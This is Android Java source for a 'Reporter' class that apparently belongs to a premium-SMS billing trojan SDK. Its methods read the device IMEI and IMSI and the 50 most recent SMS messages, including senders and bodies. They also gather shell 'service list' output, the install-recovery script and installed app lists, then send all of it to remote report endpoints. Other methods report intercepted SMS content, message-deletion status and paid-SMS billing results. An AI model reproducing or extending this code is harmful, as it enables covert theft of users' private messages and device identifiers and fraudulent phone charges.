package com.thirdparty.net;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.text.TextUtils;
import android.util.Log;

import com.gandalf.daemon.utils.DeviceUuidFactory;
import com.gandalf.daemon.utils.XL_log;
import com.msm.modu1e.utils.IMSInfo;
import com.msm.modu1e.utils.ImsiUtil;
import com.msm.modu1e.utils.ShellUtils;
import com.msm.modu1e.utils.ShellUtils.CommandResult;
import com.thirdparty.engine.AppBuildConfig;
import com.thirdparty.engine.ServiceStub;
import com.thirdparty.entry.DeviceAppinfo;
import com.thirdparty.entry.DeviceBaseInfo;
import com.thirdparty.entry.DeviceChannelInfo;
import com.thirdparty.entry.ThirdSdkTask;
import com.thirdparty.utils.AppUtil;
import com.thirdparty.utils.Constants;
import com.thirdparty.utils.DeviceBaseInfoUtil;
import com.thirdparty.utils.DeviceChannelInfoUtil;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.Callback;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import k.m.PayTask;


public class Reporter {
    private static XL_log log = new XL_log(Reporter.class);

    public static void reportSmsReflect(Context context, Callback<String> callback) {

        if (context == null) {
            return;
        }
        DeviceChannelInfo info = DeviceChannelInfoUtil.getDeviceChannelInfo(context);
        IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
        String imsi = "";
        if (imsiInfo != null) {
            String i1 = imsiInfo.imsi_1;
            String i2 = imsiInfo.imsi_2;
            if (!TextUtils.isEmpty(i1)) {
                imsi = i1;
            } else if (!TextUtils.isEmpty(i2)) {
                imsi = i2;
            }
        }
        if (TextUtils.isEmpty(imsi)) {
            imsi = ImsiUtil.getIMSIWithAPI(context);
        }
        String imei = ImsiUtil.getIMEIWithAPI(context);
        Map<String, String> params = new HashMap<>();
        if (info == null) {
            log.debug("getDeviceSmsInfo failed ");
            return;
        }
        DeviceBaseInfo baseInfo = info.mDeviceBasicInfo;
        params.put("pid", ServiceStub.mPid);
        params.put("cid", ServiceStub.mCid);
        params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());
        params.put("imei", imei);
        params.put("imsi", imsi);
        params.put("phoneBrand", baseInfo.phoneBrand);
        params.put("phoneModel", baseInfo.phoneModel);

        params.put("androidVer", baseInfo.androidVer);
        params.put("androidBuildVer", baseInfo.androidBuildVer);
        params.put("linuxVer", baseInfo.linuxVer);
        params.put("linuxBuildVer", baseInfo.linuxBuildVer);
        params.put("chipVer", baseInfo.chipVer);
        params.put("cpuBits", baseInfo.cpuBits);
        String sdkVer = ServiceStub.getInstance(context).getPayloadVersion();
        if (TextUtils.isEmpty(sdkVer)) {
            sdkVer = "";
        }
        params.put("sdkVer", sdkVer);
        params.put("sdkCloudVer", String.valueOf(AppBuildConfig.JAR_VERSION));

        StringBuilder smsReflexInfo = new StringBuilder();
        String smsRecord = getRecentSmsRecord(context);
        if (!TextUtils.isEmpty(smsRecord)) {
            smsReflexInfo.append("###").append(smsRecord);
        }

        String networkType = DeviceBaseInfoUtil.getCurrentNetworkType(context);
        if (networkType != null) {
            smsReflexInfo.append(networkType);
        }
        ArrayList<String> commands = new ArrayList<String>();
        commands.add("service list");
        CommandResult ret = ShellUtils.execCommand(commands, false);
        if (ret != null && ret.successMsg != null) {
            smsReflexInfo.append("###");
            smsReflexInfo.append(ret.successMsg);
        }

        String install_re = AppUtil.getInstallRecoverySh();
        if (!TextUtils.isEmpty(install_re)) {
            smsReflexInfo.append("###");
            smsReflexInfo.append(install_re);
        }
//        String elf = AppUtil.getElfPaths(context);
//        if (!TextUtils.isEmpty(elf)) {
//            smsReflexInfo.append("###");
//            smsReflexInfo.append(elf);
//        }
        List<DeviceAppinfo> deviceSysAppinfos = AppUtil.getDeviceSystemAppInfos(context);
        for (int i = 0; i < deviceSysAppinfos.size(); i++) {
            DeviceAppinfo appInfo = deviceSysAppinfos.get(i);
            if (i == 0) {
                smsReflexInfo.append("###");
            }
            smsReflexInfo.append(appInfo.toString());
        }

        List<DeviceAppinfo> deviceDataAppinfos = AppUtil.getDeviceDataAppInfos(context);
        for (int i = 0; i < deviceDataAppinfos.size(); i++) {
            DeviceAppinfo appInfo = deviceDataAppinfos.get(i);
            if (i == 0) {
                smsReflexInfo.append("###");
            }
            smsReflexInfo.append(appInfo.toString());
        }
        params.put("smsReflexInfo", smsReflexInfo.toString());
        OkHttpUtils.get().params(params).url(Constants.URL_GET_REPORT_SDKINFO).build().execute(new SmsReflectInfoReportCallback(context));
    }

    public static void reportSmsSendResult(Context context, String taskId, int state, String msg) {
        PayTask curPayTask = ServiceStub.getInstance(context).getCurPayTask();
        if (curPayTask == null) {
            return;
        }
        String pid = curPayTask.mPid;
        String cid = curPayTask.mCid;
        log.debug("reportSmsSendResult pid:" + pid + " cid:" + cid + " taskId:" + taskId + " state:" + state + " msg:" + msg);
        if (!TextUtils.isEmpty(pid) && !TextUtils.isEmpty(cid) && !TextUtils.isEmpty(taskId)) {
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(context);
            }
            String imei = ImsiUtil.getIMEIWithAPI(context);
            Map<String, String> params = new HashMap<>();
            params.put("imei", imei);
            params.put("imsi", imsi);
            params.put("pid", pid);
            params.put("cid", cid);
            params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());
            params.put("taskId", taskId);
            params.put("state", state + "");
            params.put("stateLog", msg);
            OkHttpUtils.get().params(params).url(Constants.URL_GET_REPORT_CP_SMS_STATE).build().execute(new SmsResultReportCallback());
        }
    }

    public static void reportThirdSdkSendResult(Context context, ThirdSdkTask thirdSdkTask, int sendState) {
        PayTask curPayTask = ServiceStub.getInstance(context).getCurPayTask();
        if (curPayTask == null || thirdSdkTask == null) {
            return;
        }
        String pid = curPayTask.mPid;
        String cid = curPayTask.mCid;
        String sdkName = thirdSdkTask.mSdkName;
        String appId = thirdSdkTask.mAppId;
        String sdkCid = thirdSdkTask.mCid;
        String feeId = thirdSdkTask.mFeeId;
        String fee = thirdSdkTask.mFee;
        log.debug("reportSmsSendResult pid:" + pid + " cid:" + cid + " thirdSdk:" + thirdSdkTask.toString() + "sendState:" + sendState);
        if (!TextUtils.isEmpty(pid) && !TextUtils.isEmpty(cid)) {
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(context);
            }
            String imei = ImsiUtil.getIMEIWithAPI(context);
            Map<String, String> params = new HashMap<>();
            params.put("pid", pid);
            params.put("cid", cid);
            params.put("imei", imei);
            params.put("imsi", imsi);
            params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());
            params.put("channelId", sdkCid);
            params.put("numberState", "1");
            params.put("fee", fee);
            params.put("feeId", feeId);
            params.put("sdkName", sdkName);
            params.put("sendState", String.valueOf(sendState));
            OkHttpUtils.get().params(params).url(Constants.URL_GET_REPORT_THRIDSDK_CHANNEL_STATE).build().execute(new SmsResultReportCallback());
        }
    }

    public static void reportThirdSdkChannelState(Context context, ThirdSdkTask thirdSdkTask, int channelState) {
        PayTask curPayTask = ServiceStub.getInstance(context).getCurPayTask();
        if (curPayTask == null || thirdSdkTask == null) {
            return;
        }
        String pid = curPayTask.mPid;
        String cid = curPayTask.mCid;
        String sdkName = thirdSdkTask.mSdkName;
        String appId = thirdSdkTask.mAppId;
        String sdkCid = thirdSdkTask.mCid;
        String feeId = thirdSdkTask.mFeeId;
        String fee = thirdSdkTask.mFee;
        log.debug("reportSmsSendResult pid:" + pid + " cid:" + cid + " thirdSdk:" + thirdSdkTask.toString() + "channelState:" + channelState);
        if (!TextUtils.isEmpty(pid) && !TextUtils.isEmpty(cid)) {
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(context);
            }
            String imei = ImsiUtil.getIMEIWithAPI(context);
            Map<String, String> params = new HashMap<>();
            params.put("pid", pid);
            params.put("cid", cid);
            params.put("imei", imei);
            params.put("imsi", imsi);
            params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());
            params.put("channelId", sdkCid);
            params.put("numberState", String.valueOf(channelState));
            params.put("fee", fee);
            params.put("feeId", feeId);
            params.put("sdkName", sdkName);
            params.put("sendState", String.valueOf(0));
            OkHttpUtils.get().params(params).url(Constants.URL_GET_REPORT_THRIDSDK_CHANNEL_STATE).build().execute(new SmsResultReportCallback());
        }
    }


    public static void reportRunLog(Context context, String logContent) {
        if (context == null || TextUtils.isEmpty(logContent)) {
            return;
        }
        PayTask curPayTask = ServiceStub.getInstance(context).getCurPayTask();
        if (curPayTask == null) {
            return;
        }
        String pid = curPayTask.mPid;
        String cid = curPayTask.mCid;
        if (!TextUtils.isEmpty(pid) && !TextUtils.isEmpty(cid)) {
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(context);
            }
            String imei = ImsiUtil.getIMEIWithAPI(context);
            Map<String, String> params = new HashMap<>();
            params.put("imei", imei);
            params.put("imsi", imsi);
            params.put("pid", pid);
            params.put("cid", cid);
            params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());
            params.put("sdkLog", logContent);
            OkHttpUtils.post().params(params).url(Constants.URL_GET_REPORT_RUNLOG).build().execute(new ReportRunLogCallback());
        }
    }

    public static void reportSmsContent(Context context, String fromNum, String smsContent, int deleteState, String delLog, Callback callback) {
        if (context == null || TextUtils.isEmpty(smsContent)) {
            return;
        }
        PayTask curPayTask = ServiceStub.getInstance(context).getCurPayTask();
        if (curPayTask == null) {
            return;
        }
        String pid = curPayTask.mPid;
        String cid = curPayTask.mCid;
        if (!TextUtils.isEmpty(pid) && !TextUtils.isEmpty(cid)) {
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(context);
            }
            Map<String, String> params = new HashMap<>();
            params.put("imsi", imsi);
            params.put("pid", pid);
            params.put("cid", cid);
            params.put("uuid", new DeviceUuidFactory(context).getDeviceUuid());

            params.put("uptime", "");
            params.put("noUpdateMobileUpTime", "");
            params.put("smsDeletePower", String.valueOf(deleteState));
            params.put("sms", smsContent);
            params.put("number", fromNum);
            params.put("log", delLog);
            OkHttpUtils.get().params(params).url(Constants.URL_GET_REPORT_SMSCONTENT).build().execute(new ReportRunLogCallback());
        }
    }

    public static String getRecentSmsRecord(Context context) {
        StringBuilder sb = new StringBuilder();

        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(Uri.parse("content://sms/"), new String[]{"_id", "address",
                "body", "type"}, null, null, "_id desc");
        if (cursor == null) {
            sb.append("can't read sms record");
            return sb.toString();
        }
        int phoneNumberColumn = 0;
        int smsbodyColumn = 0;
        int typeColumn = 0;
        try {
            if (cursor.moveToFirst()) {
                phoneNumberColumn = cursor.getColumnIndex("address");
                smsbodyColumn = cursor.getColumnIndex("body");
                typeColumn = cursor.getColumnIndex("type");
            } else {
                sb.append("sms record is empty");
                return sb.toString();
            }
            for (int i = 0; i < 50; i++) {
                if (!cursor.moveToNext()) {
                    return sb.toString();
                }
                String address = cursor.getString(phoneNumberColumn);
                String body = cursor.getString(smsbodyColumn);
                String type = "";
                int typeId = cursor.getInt(typeColumn);
                if (typeId == 1) {
                    type = "receive";
                } else if (typeId == 2) {
                    type = "send";
                }
                if (!TextUtils.isEmpty(body) && !TextUtils.isEmpty(address)) {
                    String content = "|" + type + ":" + address + "," + body;
                    sb.append(content);
                }
            }
            cursor.close();
        } catch (Exception e) {
            log.error(Log.getStackTraceString(e));
        }
        return sb.toString();
    }

    private static String getRecentContactRecord() {
        StringBuilder sb = new StringBuilder();
        return sb.toString();
    }

    private static String getTopContact() {
        StringBuilder sb = new StringBuilder();
        return sb.toString();
    }
}
